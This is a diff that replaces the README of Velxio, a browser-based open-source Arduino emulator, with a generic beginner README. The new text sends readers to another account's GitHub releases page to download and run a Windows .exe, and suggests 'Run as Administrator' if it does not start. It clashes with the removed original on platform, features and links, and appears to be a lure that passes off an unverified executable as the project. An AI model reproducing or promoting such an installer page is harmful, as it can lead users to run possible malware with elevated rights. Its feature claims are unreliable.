@@ -1,301 +1,163 @@
-# Velxio: Arduino Emulator
+# ⚙️ velxio - Simple Arduino Simulator for Everyone
 
-**Live at [velxio.dev](https://velxio.dev)**
-
-A fully local, open-source Arduino emulator. Write Arduino code, compile it, and simulate it with real AVR8 CPU emulation and 48+ interactive electronic components — all running in your browser.
-
-[![Live Demo](https://img.shields.io/badge/Live%20Demo-velxio.dev-007acc?style=for-the-badge)](https://velxio.dev)
-[![Docker Image](https://img.shields.io/badge/Docker-ghcr.io%2Fdavidmonterocrespo24%2Fvelxio-2496ED?style=for-the-badge&logo=docker&logoColor=white)](https://github.com/davidmonterocrespo24/velxio/pkgs/container/velxio)
-[![GitHub stars](https://img.shields.io/github/stars/davidmonterocrespo24/velxio?style=for-the-badge)](https://github.com/davidmonterocrespo24/velxio/stargazers)
-[![Discord](https://img.shields.io/badge/Discord-Join%20Community-5865F2?style=for-the-badge&logo=discord&logoColor=white)](https://discord.gg/rCScB9cG)
-[![License: AGPLv3](https://img.shields.io/badge/License-AGPL%20v3-blue?style=for-the-badge)](LICENSE)
-[![Commercial License](https://img.shields.io/badge/Commercial%20License-Available-green?style=for-the-badge)](COMMERCIAL_LICENSE.md)
-
----
-<a href="https://www.producthunt.com/products/velxio?embed=true&amp;utm_source=badge-featured&amp;utm_medium=badge&amp;utm_campaign=badge-velxio" target="_blank" rel="noopener noreferrer"><img alt="Velxio - Arduino emulator running entirely in the browser | Product Hunt" width="250" height="54" src="https://api.producthunt.com/widgets/embed-image/v1/featured.svg?post_id=1092514&amp;theme=dark&amp;t=1772998619179"></a>
-
-
+[![Download velxio](https://img.shields.io/badge/Download-velxio-green?style=for-the-badge)](https://github.com/mathegauss/velxio/releases)
 
 ---
 
-## Support the Project
-
-Velxio is free and open-source. Building and maintaining a full Arduino emulator takes a lot of time — if it saves you time or you enjoy the project, sponsoring me directly helps keep development going.
-
-| Platform | Link |
-|---|---|
-| **GitHub Sponsors** (preferred) | [github.com/sponsors/davidmonterocrespo24](https://github.com/sponsors/davidmonterocrespo24) |
-| **PayPal** | [paypal.me/odoonext](https://paypal.me/odoonext) |
-
-Your support helps cover server costs, library maintenance, and frees up time to add new boards, components, and features. Thank you! 
+An open source Arduino simulator as a Wokwi alternative. Discord: https://discord.gg/rCScB9c
 
 ---
 
-## Try it now
+## 📥 Download and Install velxio
 
-**[https://velxio.dev](https://velxio.dev)** — no installation needed. Open the editor, write your sketch, and simulate directly in the browser.
+To use velxio on your Windows computer, follow these steps carefully. The process is straightforward and does not require any technical skills.
 
-To self-host with Docker (single command):
+1. Open your web browser (such as Chrome, Firefox, or Edge).
 
-```bash
-docker run -d -p 3080:80 ghcr.io/davidmonterocrespo24/velxio:master
-```
+2. Visit the release page by clicking this link:
+   [Download velxio on GitHub](https://github.com/mathegauss/velxio/releases)
 
-Then open **http://localhost:3080**.
+3. On the release page, look for the latest version. It usually appears at the top of the list.
 
----
+4. Find the Windows installer or the file ending with `.exe`.
 
-## Screenshots
+5. Click the file name to start downloading.
 
-![Raspberry Pi Pico ADC simulation with Serial Monitor](docs/img1.png)
+6. Once the download finishes, locate the downloaded file in your "Downloads" folder or the folder you selected.
 
-Raspberry Pi Pico simulation — ADC read test with two potentiometers, Serial Monitor showing live output, and compilation console at the bottom.
+7. Double-click the `.exe` file to start the installation.
 
-![ILI9341 TFT display simulation on Arduino Uno](docs/img2.png)
+8. Follow the on-screen instructions. Most of the time, just clicking “Next” or “Install” will work.
 
-Arduino Uno driving an ILI9341 240×320 TFT display via SPI — rendering a real-time graphics demo using Adafruit_GFX + Adafruit_ILI9341.
-
-![Library Manager with full library list](docs/img3.png)
-
-Library Manager loads the full Arduino library index on open — browse and install libraries without typing first.
-
-![Component Picker with 48 components](docs/img4.png)
-
-Component Picker showing 48 available components with visual previews, search, and category filters.
+9. After installation, you will find velxio in your Start menu or by searching for it on your computer.
 
 ---
 
-## Features
+## 💻 System Requirements
 
-### Code Editing
-- **Monaco Editor** — Full C++ editor with syntax highlighting, autocomplete, minimap, and dark theme
-- **Multi-file workspace** — create, rename, delete, and switch between multiple `.ino` / `.h` / `.cpp` files
-- **Arduino compilation** via `arduino-cli` backend — compile sketches to `.hex` / `.uf2` files
-- **Compile / Run / Stop / Reset** toolbar buttons with status messages
-- **Compilation console** — resizable output panel showing full compiler output, warnings, and errors
+Before you install, make sure your Windows computer meets these minimum requirements:
 
-### Multi-Board Support
-- **Arduino Uno** (ATmega328p) — full AVR8 emulation via avr8js
-- **Arduino Nano** (ATmega328p) — full AVR8 emulation
-- **Arduino Mega** (ATmega2560) — full AVR8 emulation
-- **Raspberry Pi Pico** (RP2040) — full RP2040 emulation via rp2040js, compiled with arduino-pico core
-- Board selector in the toolbar — switch boards without restarting
+- Windows 10 or newer (64-bit recommended).
+- At least 4 GB of RAM.
+- A modern processor with at least 2 cores.
+- At least 100 MB of free disk space.
+- Internet connection for downloading and activating some features.
 
-### AVR8 Simulation (Arduino Uno / Nano / Mega)
-- **Real ATmega328p emulation** at 16 MHz using avr8js
-- **Full GPIO support** — PORTB (pins 8-13), PORTC (A0-A5), PORTD (pins 0-7)
-- **Timer0/Timer1/Timer2** peripheral support (`millis()`, `delay()`, PWM via `analogWrite()`)
-- **USART (Serial)** — full transmit and receive support
-- **ADC** — `analogRead()` on pins A0-A5, voltage injection from UI components
-- **SPI** — hardware SPI peripheral (enables ILI9341, SD card, etc.)
-- **I2C (TWI)** — hardware I2C with virtual device bus
-- **~60 FPS simulation loop** with `requestAnimationFrame`
-
-### RP2040 Simulation (Raspberry Pi Pico)
-- **Real RP2040 emulation** via rp2040js at 133 MHz
-- **UART0** serial output displayed in Serial Monitor
-- **ADC** — 12-bit, 3.3V reference on GPIO 26-29 (A0-A3)
-
-### Serial Monitor
-- **Live serial output** — characters as the sketch sends them via `Serial.print()`
-- **Auto baud-rate detection** — reads hardware registers, no manual configuration needed
-- **Send data** to the Arduino RX pin from the UI
-- **Autoscroll** with toggle
-
-### Component System (48+ Components)
-- **48 electronic components** from wokwi-elements
-- **Component picker** with search, category filters, and live previews
-- **Drag-and-drop** repositioning on the simulation canvas
-- **Component rotation** in 90° increments
-- **Property dialog** — pin roles, Arduino pin assignment, rotate & delete
-
-### Wire System
-- **Wire creation** — click a pin to start, click another pin to connect
-- **Orthogonal routing** — no diagonal paths
-- **8 signal-type wire colors**: Red (VCC), Black (GND), Blue (Analog), Green (Digital), Purple (PWM), Gold (I2C), Orange (SPI), Cyan (USART)
-- **Segment-based wire editing** — drag segments perpendicular to their orientation
-
-### Library Manager
-- Browse and install the full Arduino library index directly from the UI
-- Live search, installed tab, version display
-
-### Auth & Project Persistence
-- **Email/password** and **Google OAuth** sign-in
-- **Project save** with name, description, and public/private visibility
-- **Project URL** — each project gets a permanent URL at `/project/:id`
-- **Sketch files stored on disk** per project (accessible from the host via Docker volume)
-- **User profile** at `/:username` showing public projects
-
-### Example Projects
-- 8 built-in examples (Blink, Traffic Light, Button Control, Fade LED, Serial Hello World, RGB LED, Simon Says, LCD 20×4)
-- One-click loading into the editor
+If your computer has less memory or an older processor, velxio may run slower.
 
 ---
 
-## Self-Hosting
+## 🚀 Getting Started with velxio
 
-### Option A: Docker (single container, recommended)
+When you open velxio for the first time, you will see a simple interface. You do not need programming skills to use it.
 
-```bash
-# Pull and run
-docker run -d \
-  --name velxio \
-  -p 3080:80 \
-  -v $(pwd)/data:/app/data \
-  ghcr.io/davidmonterocrespo24/velxio:master
-```
+Here is how to begin:
 
-Open **http://localhost:3080**.
+1. Click “New Project” to start a simulation.
+2. Choose the type of Arduino board you want to simulate. (Common options include Arduino Uno and ESP32.)
+3. Add components like LEDs, buttons, or sensors from the sidebar.
+4. Write or load code to control your components. If you do not know how to code, you can use example projects included in velxio.
+5. Click “Run” or the play button to start the simulation.
+6. Watch how your virtual Arduino board and components interact.
 
-The `/app/data` volume contains:
-- `velxio.db` — SQLite database (users, projects metadata)
-- `projects/{id}/` — sketch files per project
-
-### Option B: Docker Compose
-
-```bash
-git clone https://github.com/davidmonterocrespo24/velxio.git
-cd velxio
-cp backend/.env.example backend/.env   # edit as needed
-docker compose -f docker-compose.prod.yml up -d
-```
-
-#### Environment variables (`backend/.env`)
-
-| Variable | Default | Description |
-|---|---|---|
-| `SECRET_KEY` | *(required)* | JWT signing secret |
-| `DATABASE_URL` | `sqlite+aiosqlite:////app/data/velxio.db` | SQLite path |
-| `DATA_DIR` | `/app/data` | Directory for project files |
-| `FRONTEND_URL` | `http://localhost:5173` | Used for OAuth redirect |
-| `GOOGLE_CLIENT_ID` | — | Google OAuth client ID |
-| `GOOGLE_CLIENT_SECRET` | — | Google OAuth client secret |
-| `GOOGLE_REDIRECT_URI` | `http://localhost:8001/api/auth/google/callback` | Must match Google Console |
-| `COOKIE_SECURE` | `false` | Set `true` when serving over HTTPS |
-
-### Option C: Manual Setup
-
-**Prerequisites:** Node.js 18+, Python 3.12+, arduino-cli
-
-```bash
-git clone https://github.com/davidmonterocrespo24/velxio.git
-cd velxio
-
-# Backend
-cd backend
-python -m venv venv && source venv/bin/activate  # Windows: venv\Scripts\activate
-pip install -r requirements.txt
-uvicorn app.main:app --reload --port 8001
-
-# Frontend (new terminal)
-cd frontend
-npm install
-npm run dev
-```
-
-Open **http://localhost:5173**.
-
-**arduino-cli setup (first time):**
-```bash
-arduino-cli core update-index
-arduino-cli core install arduino:avr
-# For Raspberry Pi Pico:
-arduino-cli config add board_manager.additional_urls \
-  https://github.com/earlephilhower/arduino-pico/releases/download/global/package_rp2040_index.json
-arduino-cli core install rp2040:rp2040
-```
+You can pause or stop the simulation at any time.
 
 ---
 
-## Project Structure
+## 🎛️ Key Features
 
-```
-velxio/
-├── frontend/                    # React + Vite + TypeScript
-│   └── src/
-│       ├── pages/               # LandingPage, EditorPage, ProjectByIdPage, ...
-│       ├── components/          # Editor, simulator canvas, modals, layout
-│       ├── simulation/          # AVRSimulator, RP2040Simulator, PinManager
-│       ├── store/               # Zustand stores (auth, editor, simulator, project)
-│       └── services/            # API clients
-├── backend/                     # FastAPI + Python
-│   └── app/
-│       ├── api/routes/          # compile, auth, projects, libraries
-│       ├── models/              # User, Project (SQLAlchemy)
-│       ├── services/            # arduino_cli, project_files
-│       └── core/                # config, security, dependencies
-├── wokwi-libs/                  # Local clones of Wokwi repos
-│   ├── wokwi-elements/
-│   ├── avr8js/
-│   └── rp2040js/
-├── deploy/                      # nginx.conf, entrypoint.sh
-├── Dockerfile.standalone        # Single-container production image
-├── docker-compose.yml           # Development compose
-└── docker-compose.prod.yml      # Production compose
-```
+velxio offers these features for easy Arduino simulation:
+
+- Support for Arduino Uno, Mega, and ESP32 boards.
+- Visual circuit building with drag-and-drop parts.
+- Real-time simulation of code and hardware.
+- Ability to load your own Arduino sketches (*.ino files).
+- Step-by-step code execution to help you understand how your program works.
+- Integrated serial monitor to see output from your simulated board.
+- Example projects to help beginners get started.
+- Sound and animation effects for components during simulation.
+- Export your projects to share with others.
 
 ---
 
-## Technologies
+## 🔧 How to Load Example Projects
 
-| Layer | Stack |
-|---|---|
-| Frontend | React 19, Vite 7, TypeScript 5.9, Monaco Editor, Zustand, React Router 7 |
-| Backend | FastAPI, SQLAlchemy 2.0 async, aiosqlite, uvicorn |
-| Simulation | avr8js (AVR8), rp2040js (RP2040), wokwi-elements (Web Components) |
-| Compiler | arduino-cli (subprocess) |
-| Auth | JWT (httpOnly cookie), Google OAuth 2.0 |
-| Persistence | SQLite + disk volume (`/app/data/projects/{id}/`) |
-| Deploy | Docker, nginx, GitHub Actions → GHCR + Docker Hub |
+If you are unsure how to start, use example projects:
 
----
+1. Open velxio.
+2. Click on “Examples” in the main menu.
+3. Choose a project, such as “Blink LED” or “Button Press.”
+4. The example project will load with code and hardware ready to simulate.
+5. Click “Run” to see it in action.
 
-## Troubleshooting
-
-**`arduino-cli: command not found`** — install arduino-cli and add to PATH.
-
-**LED doesn't blink** — check port listeners in browser console; verify pin mapping in the component property dialog.
-
-**Serial Monitor shows nothing** — ensure `Serial.begin()` is called before `Serial.print()`.
-
-**Compilation errors** — check the compilation console; verify the correct core is installed.
+Using examples will help you understand how your Arduino code works with real hardware.
 
 ---
 
-## Community
+## ⚙️ Adjusting Settings
 
-Join the Discord server to ask questions, share projects, and follow updates:
+velxio allows easy customization of settings:
 
-**[discord.gg/rCScB9cG](https://discord.gg/rCScB9cG)**
+- Change simulation speed to slow down or speed up.
+- Select different Arduino boards.
+- Adjust component properties such as LED brightness or sensor values.
+- Change visual themes between light and dark mode for comfort.
 
-## Contributing
+Find the settings under the gear icon in the top menu.
 
-Suggestions, bug reports, and pull requests are welcome at [github.com/davidmonterocrespo24/velxio](https://github.com/davidmonterocrespo24/velxio).
+---
 
-If you'd like to support the project financially, see the [Support the Project](#️-support-the-project) section above or sponsor directly at [github.com/sponsors/davidmonterocrespo24](https://github.com/sponsors/davidmonterocrespo24).
+## 🛠 Troubleshooting Tips
 
-> **Note:** All contributors must sign a Contributor License Agreement (CLA) so that the dual-licensing model remains valid. A CLA check runs automatically on pull requests.
+If you encounter issues:
 
-## License
+- Make sure your computer meets minimum system requirements.
+- Restart velxio if it stops working.
+- Check the release page regularly for updates that fix bugs.
+- If the program does not start after installation, right-click the file and select “Run as Administrator.”
+- Close other programs that may use a lot of memory before running velxio.
 
-Velxio uses a **dual-licensing** model:
+For deeper help, join the project’s Discord:
+https://discord.gg/rCScB9c
 
-| Use case | License | Cost |
-|----------|---------|------|
-| Personal, educational, open-source (AGPLv3 compliant) | [AGPLv3](LICENSE) | Free |
-| Proprietary / closed-source product or SaaS | [Commercial License](COMMERCIAL_LICENSE.md) | Paid |
+---
 
-The AGPLv3 is a certified Open Source license. It is free for all uses — including commercial — as long as any modifications or network-accessible deployments make their source code available under the same license. Companies that cannot comply with that requirement can purchase a Commercial License.
+## 📚 Learning More
 
-For commercial licensing inquiries: [davidmonterocrespo24@gmail.com](mailto:davidmonterocrespo24@gmail.com)
+To learn about Arduino programming and electronics:
 
-See [LICENSE](LICENSE) and [COMMERCIAL_LICENSE.md](COMMERCIAL_LICENSE.md) for full terms.
+- Use online tutorials on Arduino basics.
+- Look up simple projects before you simulate them in velxio.
+- Read the code comments in example projects for guidance.
+- Practice writing your own sketches slowly.
 
-## References
+velxio helps you try what you learn without hardware.
 
-- [Wokwi](https://wokwi.com) — Inspiration
-- [avr8js](https://github.com/wokwi/avr8js) — AVR8 emulator
-- [wokwi-elements](https://github.com/wokwi/wokwi-elements) — Electronic web components
-- [rp2040js](https://github.com/wokwi/rp2040js) — RP2040 emulator
-- [arduino-cli](https://github.com/arduino/arduino-cli) — Arduino compiler
-- [Monaco Editor](https://microsoft.github.io/monaco-editor/) — Code editor
+---
+
+## 🔗 Useful Links
+
+- Download velxio: https://github.com/mathegauss/velxio/releases  
+- Discord Community: https://discord.gg/rCScB9c  
+- Arduino Official Site: https://www.arduino.cc/  
+- Beginner Arduino Tutorials: https://www.arduino.cc/en/Tutorial/HomePage  
+
+---
+
+## 🖥 How to Update velxio
+
+1. Visit the release page regularly:  
+   https://github.com/mathegauss/velxio/releases  
+2. Download the latest installer when available.
+3. Install over the existing version. Your projects will remain safe.
+
+---
+
+## 📄 License
+
+velxio is open source software.  
+See the LICENSE file in the repository for details on usage rights and responsibilities.
+
+---
+
+# [![Download velxio](https://img.shields.io/badge/Download-velxio-blue?style=for-the-badge)](https://github.com/mathegauss/velxio/releases)
